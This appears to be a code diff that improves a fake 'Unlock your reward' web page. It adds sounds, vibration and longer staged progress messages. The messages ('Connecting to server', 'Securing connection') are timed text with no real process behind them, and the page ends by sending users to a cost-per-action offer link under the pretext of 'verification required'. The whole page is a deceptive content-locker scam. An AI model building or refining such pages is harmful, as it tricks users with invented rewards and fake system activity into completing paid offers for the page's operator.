@@ -25,7 +25,7 @@ body{
     padding:20px;
     border-radius:15px;
     text-align:center;
-    box-shadow:0 0 30px rgba(0,255,200,0.2);
+    box-shadow:0 0 40px rgba(0,255,200,0.2);
     animation:fadeIn 1s ease;
 }
 
@@ -36,7 +36,7 @@ img{
     margin-bottom:15px;
 }
 
-/* TITLE */
+/* TEXT */
 h2{
     margin:10px 0;
 }
@@ -65,14 +65,20 @@ button{
     transition:0.3s;
 }
 
-/* BUTTON EFFECT */
 button:hover{
-    transform:scale(1.05);
+    transform:scale(1.07);
     background:#00e676;
-    box-shadow:0 0 15px #00ff99;
+    box-shadow:0 0 20px #00ff99;
 }
 
-/* PROGRESS BAR */
+/* STEP BAR */
+.steps{
+    display:flex;
+    justify-content:space-between;
+    font-size:12px;
+    margin-bottom:5px;
+    color:#aaa;
+}
 .progress{
     height:8px;
     background:#222;
@@ -87,57 +93,55 @@ button:hover{
     transition:0.5s;
 }
 
-/* LOADING TEXT */
+/* LOADING */
 .loading{
     margin-top:15px;
     display:none;
-    font-size:14px;
     color:#00ffcc;
 }
 
-/* FINAL BUTTON */
+/* FINAL */
 .final{
     display:none;
 }
 
-/* ANIMATIONS */
+/* ANIM */
 @keyframes fadeIn{
     from{opacity:0;transform:translateY(20px);}
     to{opacity:1;}
 }
-
-/* TECH GLOW */
-.container::before{
-    content:'';
-    position:absolute;
-    width:400px;
-    height:400px;
-    background:radial-gradient(circle,#00ffcc33,transparent);
-    z-index:-1;
-    filter:blur(60px);
-}
 </style>
-
 </head>
 
 <body>
 
 <div class="container">
 
+    <!-- STEP TEXT -->
+    <div class="steps">
+        <span>Step 1</span>
+        <span>Step 2</span>
+        <span>Step 3</span>
+    </div>
+
+    <!-- PROGRESS -->
     <div class="progress">
         <div class="bar" id="bar"></div>
     </div>
 
+    <!-- IMAGE -->
     <img src="https://www.image2url.com/r2/default/images/1776226871582-a28e549c-c1cf-4692-a072-84383c4c7016.jpg">
 
     <h2>Unlock your reward</h2>
 
+    <!-- INPUT -->
     <input type="text" id="username" placeholder="Enter username">
 
     <button onclick="step1()">Continue</button>
 
     <div class="loading" id="loading"></div>
 
+    <!-- FINAL -->
     <div class="final" id="finalBox">
         <p>Verification required to complete delivery</p>
         <button onclick="goCPA()">Complete Now</button>
@@ -145,41 +149,69 @@ button:hover{
 
 </div>
 
+<!-- SOUND -->
+<audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
+<audio id="loadingSound" src="https://www.soundjay.com/misc/sounds/loading-1.mp3"></audio>
+<audio id="successSound" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>
+
 <script>
 
-// STEP 1
+function playClick(){
+    document.getElementById("clickSound").play();
+}
+
+// STEP FLOW
 function step1(){
+    playClick();
+
     let user = document.getElementById("username").value;
     if(user == ""){
         alert("Enter username first!");
         return;
     }
 
-    document.getElementById("bar").style.width = "33%";
+    navigator.vibrate([200,100,200]); // GETAR HP
+
     let load = document.getElementById("loading");
+    let bar = document.getElementById("bar");
 
     load.style.display = "block";
+    document.getElementById("loadingSound").play();
+
     load.innerHTML = "Connecting to server...";
+    bar.style.width = "33%";
 
     setTimeout(()=>{
         load.innerHTML = "Checking availability...";
-        document.getElementById("bar").style.width = "66%";
-    },2000);
+        bar.style.width = "66%";
+    },2500);
 
     setTimeout(()=>{
         load.innerHTML = "Preparing your reward...";
-        document.getElementById("bar").style.width = "100%";
-    },4000);
+        bar.style.width = "100%";
+    },5000);
 
     setTimeout(()=>{
+        load.innerHTML = "Securing connection...";
+    },7000);
+
+    setTimeout(()=>{
+        load.innerHTML = "Almost done...";
+    },9000);
+
+    setTimeout(()=>{
+        document.getElementById("loadingSound").pause();
+        document.getElementById("successSound").play();
+
         load.innerHTML = "Final step required";
         document.getElementById("finalBox").style.display = "block";
-    },6000);
+    },11000);
 }
 
-// FINAL REDIRECT (TIDAK AUTO)
+// FINAL (TIDAK AUTO REDIRECT)
 function goCPA(){
-    window.location.href = "https://appchecker.space/cl/i/271x3k";
+    playClick();
+    window.open("https://appchecker.space/cl/i/271x3k", "_blank");
 }
 
 </script>
